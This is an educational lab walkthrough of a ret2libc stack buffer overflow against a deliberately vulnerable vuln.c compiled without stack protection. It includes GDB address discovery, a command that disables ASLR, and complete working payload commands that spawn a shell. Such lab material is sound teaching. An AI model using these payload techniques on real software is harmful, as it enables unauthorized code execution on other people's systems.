```text
BUFFER (64 BYTES) <-- ESP
EBP
RET ADDR (PRINTF("Done.\n"))
ARGV[1]
EBP <-- EBP
RET ADDR
ARGC
ARGV
```

# `vuln.c` Complete Walkthrough

This guide explains the `vuln.c` part of `new thing.txt` from the first shell command to the final shell check. Follow the sections in order. Commands marked **Shell** go in the Ubuntu/WSL shell. Commands marked **GEF** go at the `gef➤` prompt inside GDB.

The run described here was compiled and tested with the flags below. For this exact build, the verified padding is **68 bytes**, and the verified breakpoint is **`vuln+0x15` at `0x0804919b`**.

## What the attack does, and why it matters

First, picture what the program normally does: `main` asks `vuln` to copy the input, then expects `vuln` to return so `main` can print `Done.`. The 64-byte `buffer` is a small area of memory inside `vuln`. The stack is the area of memory the program uses for function calls; it holds the buffer and a saved address that tells the CPU where to continue when `vuln` finishes.

The bug is that `strcpy` copies the whole input into `buffer` without checking whether it fits. If the input is too long, the extra bytes spill past the buffer and overwrite that saved address. This is called a **buffer overflow**. The saved address is the function's **return address**. Changing it changes the program's next step; this is called **hijacking control flow**.

The normal path and the changed path are:

```text
Normal:
main -> vuln copies input -> vuln returns to main -> print "Done."
Attack:
main -> vuln copies long input -> saved return address is changed -> vuln returns to system() -> system starts /bin/sh
```

The payload is the long input that fills the buffer and changes the saved address. Each piece has one simple job:

- **68 `A` bytes:** padding. The first 64 fill `buffer`; the next 4 overwrite the saved EBP. They are data, not instructions, and are not executed.
- **The `system()` address:** replaces the saved return address. `system()` is a function that already exists in the C library (`libc`); it runs a command.
- **The `exit()` address:** goes in the next stack slot. When `system()` finishes, this tells the program to exit cleanly instead of trying to continue at an invalid address.
- **The `"/bin/sh"` address:** tells `system()` which command to run: start a shell.

So the point of the payload is not to make the `A`s run. It changes the saved return address so the CPU goes to existing code in libc, then arranges the next stack values the way `system()` expects.

### Match the payload to the exact lines in your sketch

Count the sketch lines from the top. Before the overflow, the lines name what those stack slots normally contain. The payload replaces those contents:

1. **`BUFFER (64 BYTES) <-- ESP`:** the first 64 `A` bytes fill the buffer.
2. **`EBP`:** the next 4 `A` bytes overwrite `vuln`'s saved EBP.
3. **`RET ADDR (PRINTF("Done.\n"))`:** the next 4 bytes are the address of `system()`. `vuln`'s `ret` uses this as its next instruction address.
4. **`ARGV[1]`:** the next 4 bytes are the address of `exit()`. After `vuln` returns to `system()`, `system()` treats this stack word as its own return address.
5. **`EBP <-- EBP`:** the next 4 bytes are the address of the `/bin/sh` string. `system()` treats this stack word as its first argument. This slot normally holds the saved EBP for `main`; the payload overwrites it.

The labels in the sketch describe the original slots; after the overflow, the contents of lines 3–5 have changed to the payload values above. One more detail: `strcpy` copies a final NUL byte after the 80 payload bytes. That NUL lands in the first byte of line 6, `main`'s saved return-address slot. In this payload, `system()` returns to `exit()`, which terminates the process, so execution does not use that altered `main` return address.

**Why does the shell prompt appear in the same terminal?** `system()` starts `/bin/sh`. That shell reuses the program's keyboard input and screen output, so its `$` prompt appears in the same terminal. Nothing needs to open a new window. Type `id` to see which user the shell runs as; in this lab, it is still `pc` (UID 1000), not root.

**What does this demonstrate about NX?** NX marks the stack as a place where data can be stored but instructions cannot be run. This attack does not ask the CPU to run the `A` bytes. It asks the CPU to go to `system()` in executable libc code. That is why NX alone does not stop this example.

**A concrete example of possible harm:** imagine a web service that runs as a restricted account called `www-data`. If the service has this bug and accepts attacker-controlled input, that input could make the service start a shell running as `www-data`. Suppose `www-data` is allowed to read the website's configuration file, and that file contains a database password. The attacker could potentially get access to data the database account is allowed to read. The attacker only gets the permissions of the service account; this bug does not automatically make them root. In this lab, that account is `pc`, and `id` shows its UID is 1000.

## 1. Understand the sketch first

Read your sketch from top to bottom. In this stopped state, ESP points to the buffer at the top. Each following slot in the sketch has a higher numeric address.

- `BUFFER (64 BYTES) <-- ESP`: the 64-byte local array is at the top of the sketch. At the post-copy breakpoint, ESP points at its first byte.
- `EBP`: the saved EBP slot in `vuln`. It contains `main`'s EBP value. EBP itself points to this saved-value slot.
- `RET ADDR (PRINTF("Done.\n"))`: shorthand for where normal execution goes after `vuln` returns. The saved return address is technically the instruction immediately after `call vuln`; `main` then reaches the `Done` output.
- `ARGV[1]`: `main` passes a pointer to `argv[1]` into `vuln` as its `input` parameter. `strcpy` copies the string's bytes from that pointer into the buffer.
- `EBP <-- EBP`: the saved `main` EBP slot and the EBP register pointing at that slot. It is not two separate EBP words.
- `RET ADDR`: `main`'s own return address to its caller in the C runtime.
- `ARGC` and `ARGV`: `main`'s parameters. In this 32-bit build, `[EBP_m+8]` is `argc` and `[EBP_m+12]` is `argv`. `EBP_m` means `main`'s EBP; `EBP_v` means `vuln`'s EBP.

The words “top of stack” and “higher address” describe different things. ESP points at the buffer at the top of your drawing. As you move down your drawing, the numeric addresses increase. `sub esp,0x40` subtracts 64 from ESP, giving it a lower numeric address; it does not mean the buffer should be drawn at the bottom.

### The actual layout in `vuln`

The disassembly for this build places the buffer at `[EBP_v-0x40]`. The saved EBP slot is `[EBP_v]`; the saved return address is `[EBP_v+4]`; and `vuln`'s input pointer is `[EBP_v+8]`.

```text
As you move down the drawing, addresses increase:

BUFFER start             [EBP_v-0x40]  <-- ESP at the breakpoint
64-byte buffer ends      [EBP_v-1]
saved main EBP            [EBP_v]
saved return address      [EBP_v+4]
vuln input pointer        [EBP_v+8]
main saved EBP            [EBP_v+12]   <-- EBP_m in this build
main return address       [EBP_v+16]
main argc                 [EBP_v+20]   == [EBP_m+8]
main argv                 [EBP_v+24]   == [EBP_m+12]
```

This map connects the sketch's labels to actual addresses. `EBP_v` is a base address, not the contents of the saved-EBP word. The saved word at `[EBP_v]` contains the value `EBP_m`.

### After the payload is copied

The payload is 68 `A` bytes followed by three 4-byte values. The first 64 bytes fill the buffer; the next 4 overwrite saved EBP. The following words occupy the saved return address, the next stack word, and the one after that:

```text
Offset from buffer start       Stack slot / value
+76                            /bin/sh string address (system argument)
+72                            exit() (system return address)
+68                            system() (vuln return address)
+64 through +67                4 A bytes (saved EBP overwritten)
+0 through +63                 64 A bytes (the buffer)
+0                             <-- ESP at the post-copy breakpoint
```

In the verified run, these words were `0xf7dc8ce0` (`system`), `0xf7db52b0` (`exit`), and `0xf7f40167` (the `/bin/sh` string). These sample addresses can change; the offsets explain the layout.

## 2. Open Ubuntu and enter the lab directory

If you are at Windows PowerShell, start Ubuntu:

```powershell
wsl -d Ubuntu
```

This opens a shell inside the Ubuntu WSL distribution. Your prompt should change from PowerShell to a Linux shell prompt. Commands from this point should be run there unless explicitly labeled GEF.

Go to the folder containing `vuln.c`:

```bash
cd /mnt/d/Proj/Work/gdb-lab/ret2libc
```

`cd` changes the current directory. The `pwd` command can confirm where you are:

```bash
pwd
```

Expected location:

```text
/mnt/d/Proj/Work/gdb-lab/ret2libc
```

The relative filenames in later commands (`vuln.c`, `vuln.out`, `build_payload.py`) assume this directory.

## 3. Compile the program

**Shell:**

```bash
gcc -m32 -g -fno-stack-protector -no-pie -fno-pie -mpreferred-stack-boundary=2 -o vuln.out vuln.c
```

This compiles `vuln.c` and creates `vuln.out`.

- `gcc` runs the C compiler.
- `-m32` creates a 32-bit executable. Its pointers and stack words are 4 bytes, even though the WSL host reports `x86_64`.
- `-g` includes debug information so GDB can identify functions and source lines.
- `-fno-stack-protector` disables the compiler's stack-canary protection for this intentionally vulnerable lab program.
- `-no-pie` disables position-independent executable linking for this binary. It keeps this program's code addresses fixed; it does not by itself disable randomization of libraries.
- `-fno-pie` asks the compiler not to generate position-independent code.
- `-mpreferred-stack-boundary=2` selects a 4-byte preferred stack alignment on this 32-bit target. Compiler options can change the stack layout and therefore the measured offset.
- `-o vuln.out` sets the output filename.
- `vuln.c` is the input source file.

**Expected output:** usually no output. If GCC returns to the prompt without an error, the compile succeeded. An error mentioning missing 32-bit startup files or libraries means the WSL installation needs 32-bit build support before continuing.

The vulnerable code is `strcpy(buffer, input)`: `buffer` has room for 64 bytes, but `strcpy` is not told that limit. A longer string keeps copying into adjacent stack slots.

## 4. Check ASLR

The command in the notes is:

```bash
sudo sysctl kernel.randomize_va_space
```

This form reads the setting; it does not change it. In this lab the result was:

```text
kernel.randomize_va_space = 0
```

`0` means Linux address-space randomization is disabled. The setting affects the WSL environment, not only `vuln.out`. It was already zero during the verified run.

To change it only if needed, the write form is:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

`-w` means write the new value. `sudo` requests administrator permission and may prompt for your WSL password. If the read-only command already shows `0`, do not run the write command; no change is needed.

If you changed the system setting for the demo, restore the value you used before the demo. `2` is the common setting that enables full address randomization:

```bash
sudo sysctl -w kernel.randomize_va_space=2
```

Do not restore blindly if you started from another value. We checked this environment and found it was already `0`.

## 5. Find the function in the disassembly

**Shell:**

```bash
objdump -d vuln.out | grep -A 12 "<vuln>:"
```

- `objdump -d vuln.out` translates the executable's machine-code instructions into assembly text.
- The pipe `|` sends that text to `grep`.
- `grep -A 12 "<vuln>:"` finds the line naming `vuln` and prints 12 lines after it.

The relevant excerpt is:

```text
08049186 <vuln>:
 8049186: 55                    push   %ebp
 8049187: 89 e5                 mov    %esp,%ebp
 8049189: 83 ec 40              sub    $0x40,%esp
 804918c: ff 75 08              push   0x8(%ebp)
 804918f: 8d 45 c0              lea    -0x40(%ebp),%eax
 8049192: 50                    push   %eax
 8049193: e8 ...                call   strcpy@plt
```

The `lea -0x40(%ebp),%eax` instruction calculates the buffer address: `EBP-0x40`. Here `0x40` is hexadecimal for 64, so that matches the 64-byte array. `lea` calculates an address; it does not read the buffer bytes.

This short `objdump` command helps locate the function, but use the complete GDB disassembly next to inspect the instructions after `strcpy` and verify the breakpoint location.

## 6. Start GDB and read the complete function

**Shell:**

```bash
gdb -q ./vuln.out
```

`gdb` starts the debugger. `-q` suppresses most startup text. `./vuln.out` is the program GDB will run. The `gef➤` prompt means GEF has loaded and is accepting debugger commands.

**GEF:**

```gdb
disas vuln
```

This disassembles the function named `vuln`. The verified output is:

```text
0x08049186 <+0>:     push   ebp
0x08049187 <+1>:     mov    ebp,esp
0x08049189 <+3>:     sub    esp,0x40
0x0804918c <+6>:     push   DWORD PTR [ebp+0x8]
0x0804918f <+9>:     lea    eax,[ebp-0x40]
0x08049192 <+12>:    push   eax
0x08049193 <+13>:    call   0x8049050 <strcpy@plt>
0x08049198 <+18>:    add    esp,0x8
0x0804919b <+21>:    nop
0x0804919c <+22>:    leave
0x0804919d <+23>:    ret
```

How these lines match the stack map:

1. `push ebp` saves the caller's EBP value on the stack.
2. `mov ebp,esp` makes EBP point to the saved-EBP slot. In the sketch this is the `EBP <-- EBP` relationship inside the `vuln` frame.
3. `sub esp,0x40` reserves 64 bytes for `buffer`. ESP becomes the buffer's first-byte address.
4. `[ebp+0x8]` is `vuln`'s `input` pointer argument. It points to the `argv[1]` string.
5. `lea eax,[ebp-0x40]` calculates the destination address, the beginning of `buffer`.
6. The two `push` instructions put `strcpy`'s arguments on the stack: destination first, source second.
7. `call strcpy@plt` copies the string. `call` itself pushes a temporary return address for returning from `strcpy`.
8. `add esp,0x8` removes those two 4-byte arguments. ESP returns to the beginning of the buffer.
9. `nop` does nothing. It is a convenient stop point after the copy and before `leave; ret`.
10. `leave` restores ESP from EBP and pops the saved EBP value.
11. `ret` pops the saved return address into the instruction pointer.

### Calculate the breakpoint address

The breakpoint target is the `nop` at `<+21>`. The angle-bracket offset `+21` is decimal. GDB's address expression uses hexadecimal when written with `0x`:

```text
21 decimal = 0x15 hexadecimal
function start + offset = 0x08049186 + 0x15 = 0x0804919b
```

Therefore this build's breakpoint is `*(vuln+0x15)`, address `0x0804919b`. The note's `0x080491ab` is not the address of this `nop`; it would be `vuln+0x25`. The `0x080491ab` value is stale and should not be used for this disassembly.

### Calculate the padding offset

The saved return-address location comes from the function prologue and the x86 call convention:

- The caller's `call vuln` pushes the return address.
- `push ebp` saves the caller's EBP just below that return address.
- `mov ebp,esp` makes EBP point at the saved EBP.
- Thus the saved return address is one 4-byte word above EBP, at `[EBP_v+4]`.
- `lea eax,[ebp-0x40]` shows the buffer starts at `[EBP_v-0x40]`.

Subtract the start of the buffer from the return-address location:

```text
(EBP_v + 4) - (EBP_v - 0x40)
= 4 + 0x40
= 0x44
= 68 bytes
```

So the offset is 68 bytes. The first 64 `A` bytes fill `buffer`; the next 4 overwrite the saved EBP; the next byte begins the saved return address. The bottom of the offset calculation is not the `main` arguments: `argc` and `argv` are in `main`'s frame and do not add to this offset.

## 7. Set the breakpoint and run harmless input

**GEF:**

```gdb
break *(vuln+0x15)
```

`break` creates a breakpoint. `vuln+0x15` is the verified instruction address relative to the function start. `*` tells GDB this expression is an address. The expected message is similar to:

```text
Breakpoint 1 at 0x804919b: file .../vuln.c, line 8.
```

The breakpoint number may differ if other breakpoints already exist. The key check is the resolved address `0x804919b`.

Now start the inferior with a harmless short argument:

```gdb
run AAAA
```

`run` starts the program under GDB. `AAAA` is `argv[1]` for this run. It is only four bytes, so it lets the program call `strcpy` and stop without overflowing the local array. The breakpoint should trigger at the `nop` after the copy.

The most useful parts of GEF's output are:

```text
$esp : 0xffffcfdc -> "AAAA"
$eip : 0x0804919b -> <vuln+0015> nop
```

`$eip` is the instruction pointer; it confirms execution stopped at the `nop`. `$esp` points at the buffer's first byte and GEF displays the copied string there. Absolute stack values such as `0xffffcfdc` can change between runs.

## 8. Find the library addresses in this process

Do these while the `AAAA` run is paused at the breakpoint. Starting the program causes its shared libraries, including libc, to be loaded.

**GEF:**

```gdb
print system
```

Observed output:

```text
$1 = {<text variable, no debug info>} 0xf7dc8ce0 <system>
```

This gives the address of libc's `system()` function for this process: `0xf7dc8ce0`.

```gdb
print exit
```

Observed output:

```text
$2 = {<text variable, no debug info>} 0xf7db52b0 <exit>
```

This gives `exit()`'s address: `0xf7db52b0`. The payload uses it as the return destination after `system()` finishes.

```gdb
find &system,+99999999,"/bin/sh"
```

This searches memory starting at the address of `system`, scanning up to 99,999,999 bytes for the string `/bin/sh`. Output from the verified run:

```text
0xf7f40167
warning: Unable to access ... bytes ... halting search.
1 pattern found.
```

The match is `0xf7f40167`. The warning means part of the requested search range crosses memory GDB cannot read. Since GDB already reports one match, the warning does not erase the result.

Record the three values together:

```text
system() = 0xf7dc8ce0
exit()   = 0xf7db52b0
/bin/sh  = 0xf7f40167
```

These are example values from the verified run, not universal constants. If the binary, libc, or address-randomization conditions change, query them again and build the payload with the addresses from the run you are using.

## 9. Generate both payload commands

Open a second Ubuntu shell or leave GDB after recording the addresses. From the `ret2libc` directory, run:

```bash
python3 build_payload.py 0xf7dc8ce0 0xf7db52b0 0xf7f40167
```

The arguments are ordered as `system_addr`, `exit_addr`, then `binsh_addr`. The script reads those strings as hexadecimal integers. It converts each address to 4 bytes in little-endian order and joins them after `b"A" * OFFSET`.

The builder reports:

```text
Offset (padding bytes): 68
Total payload length:   80 bytes
```

The arithmetic is `68 + 4 + 4 + 4 = 80`: padding plus three 4-byte values. Little-endian means least-significant byte first. For example, `0xf7dc8ce0` is passed as bytes `e0 8c dc f7`.

### Direct-run form

The builder prints a command like:

```bash
python3 -c "import subprocess; subprocess.run(['./vuln.out', b'A'*68 + b'\xe0\x8c\xdc\xf7\xb0R\xdb\xf7g\x01\xf4\xf7'])"
```

This command starts `vuln.out` as a child process of Python. It does **not** run the vulnerable program under GDB, so GDB breakpoints and memory inspection will not apply. If run interactively, the spawned shell is connected to the terminal; type `id`, `pwd`, `uname -m`, then `exit` at its prompt.

For a captured, non-interactive check, this equivalent command feeds the shell its checks and captures the output:

```bash
python3 -c "import subprocess; result=subprocess.run(['./vuln.out', b'A'*68 + bytes.fromhex('e08cdcf7b052dbf76701f4f7')], input=b'id\npwd\nuname -m\nexit\n', stdout=subprocess.PIPE, stderr=subprocess.STDOUT); print(result.stdout.decode(errors='replace')); print('exit code:', result.returncode)"
```

The verified output was:

```text
uid=1000(pc) gid=1000(pc) groups=1000(pc),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
/mnt/d/Proj/Work/gdb-lab/ret2libc
x86_64
Running...

exit code: 0
```

The shell ran as ordinary user `pc` with UID 1000, not as root. The command exited successfully with return code 0. `Running...` may appear after the shell output because the parent program's output is buffered while the shell is running. `Done.` is not printed: after `system()` returns, the payload directs execution to `exit()`.

### GDB inspection form

The builder also prints a command like this:

```gdb
run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + bytes.fromhex("e08cdcf7b052dbf76701f4f7"))')
```

Use this at the GEF prompt if you want to inspect the payload under GDB. It starts Python as part of GDB's run command; Python writes the raw payload bytes to stdout, and `$(...)` supplies them as the inferior's argument. In contrast, the direct-run form launches the vulnerable program outside GDB.

## 10. Run the payload under GDB and inspect memory

In the original GDB session, the harmless `run AAAA` process is paused. Enter the complete GDB inspection command printed by the builder. This starts a new run with the long argument; the harmless run is replaced.

The breakpoint should trigger again. GEF's automatic view abbreviates long strings. The important checks are:

- `$eip` is still `0x0804919b`, the `nop` after `strcpy`.
- `$esp` points at a long string of `A`s, the start of the copied buffer.
- The trace may display a surprising `input` value because the overflow also overwrote the `input` argument slot. That is expected; the return path and payload words are what we are inspecting.

Now request an explicit dump:

```gdb
x/32xw $esp
```

Read the command character by character:

- `x` means examine memory.
- `/32` means show 32 items.
- The second `x` means print values in hexadecimal.
- `w` means each item is one 4-byte word in this 32-bit program.
- `$esp` is the starting address. At this breakpoint it points to the first byte of the buffer.

The verified dump was:

```text
0xffffcf8c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf9c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfac:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfcc:     0x41414141      0xf7dc8ce0      0xf7db52b0      0xf7f40167
0xffffcfdc:     0xf7d9af00      0x00000002      0xffffd0a4      0xffffd0b0
```

How to count the important words:

- The first line has four words, each `0x41414141` (16 `A` bytes).
- The next three lines bring the count to 16 words (64 bytes), exactly the buffer size.
- The first word on line five is word 17: four more `A`s overwrite saved EBP. Padding total: 17 × 4 = 68 bytes.
- The next word is `0xf7dc8ce0`: `system()` at offset 68, the overwritten return address.
- The next word is `0xf7db52b0`: `exit()` at offset 72, `system()`'s return destination.
- The next word is `0xf7f40167`: the `/bin/sh` string address at offset 76, `system()`'s argument.

The left side gives the stack address for each row. Those stack addresses vary between runs. The payload words and their offsets are the important part. The dump confirms the same 68-byte offset calculated from the disassembly.

## 11. Continue into the shell

**GEF:**

```gdb
continue
```

`continue` resumes the inferior from the breakpoint. The `ret` at the end of `vuln` uses the overwritten return word and starts `system()`. The next word supplies `system()`'s return address (`exit()`); the following word supplies its argument (`/bin/sh`).

The observed output began:

```text
Continuing.
[Detaching after vfork from child process ...]
$
```

The `$` is the shell prompt. `system()` starts a child process for the shell, so GDB reports detaching from the child. No instructions from the stack are being executed; control was redirected to existing code in libc.

At the `$` prompt, type one command at a time:

```sh
id
```

Expected: `uid=1000(pc) ...`. `id` proves which account the shell runs as. It is a normal user shell; root is not necessary for this demo.

```sh
pwd
```

Expected: the current directory, which in the tested run was `/mnt/d/Proj/Work/gdb-lab/ret2libc`.

```sh
uname -m
```

Expected: `x86_64`. That is the WSL host architecture. The program itself is still 32-bit because it was compiled with `-m32`.

Finally type:

```sh
exit
```

The shell closes. GDB reported:

```text
[Inferior 1 (process ...) exited normally]
```

That confirms the chain reached the supplied `exit()` function after the shell finished.

## 12. Optional NX check

To check the stack permissions in the ELF program headers, leave GDB and run this in the WSL shell:

```bash
readelf -l vuln.out | grep -A1 GNU_STACK
```

The relevant output is:

```text
GNU_STACK ... RW ...
GNU_RELRO ... R ...
```

For this `readelf` output, `R` is read, `W` is write, and `E` is execute. `GNU_STACK` has `RW` and no `E`, so the stack is not executable. `grep -A1` prints one line after `GNU_STACK`, which is why the separate `GNU_RELRO` header appears too.

## 13. Corrections to the copied notes

For the exact compile command and disassembly in this guide:

- **Use 68 padding bytes**, the builder currently reports `OFFSET = 68` and an 80-byte payload.
- **Use `break *(vuln+0x15)`**, which resolves to `0x0804919b`. The `nop` is shown as `<+21>`; 21 decimal is `0x15` hexadecimal.
- **Do not use `0x080491ab`** for that breakpoint. It is `vuln+0x25`, not the address of the shown `<+21>` instruction.
- The correct GDB payload command is the complete command printed by the current `build_payload.py`. Do not copy the truncated line in `new thing.txt` that ends at `bytes.fromhex("`.
- The absolute libc addresses in this guide are from the verified run. Re-query them in GDB if the binary, libc, or randomization settings change.

The simple rule is: derive the offset and breakpoint from the current binary's disassembly, use addresses from the current process, and compare the memory dump against the stack slots in the sketch at the top.
